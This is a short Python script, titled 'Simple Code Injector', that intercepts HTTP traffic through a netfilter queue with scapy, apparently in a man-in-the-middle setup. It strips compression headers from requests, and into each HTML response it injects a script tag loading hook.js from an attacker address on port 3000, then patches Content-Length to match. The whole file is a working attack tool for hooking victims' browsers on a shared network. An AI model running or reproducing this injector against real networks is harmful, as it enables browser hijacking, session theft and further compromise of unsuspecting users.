#!/usr/bin/env python
import re
import scapy.all as scapy
from snfq import SNFQ


def set_load(pkt, load):
    pkt[scapy.Raw].load = load
    del pkt[scapy.IP].len
    del pkt[scapy.IP].chksum
    del pkt[scapy.TCP].chksum
    return pkt


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80 or scapy_packet[scapy.TCP].dport == 10000:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 80 or scapy_packet[scapy.TCP].sport == 10000:
            print("[+] Response")
            injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
            print("[+] Injecting!")
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


print("Simple Code Injector 0.01 by Ravehorn")
destination = raw_input("Destination (sslstrip, forward, local) -> ")
queue = SNFQ(process_packet, destination=destination)
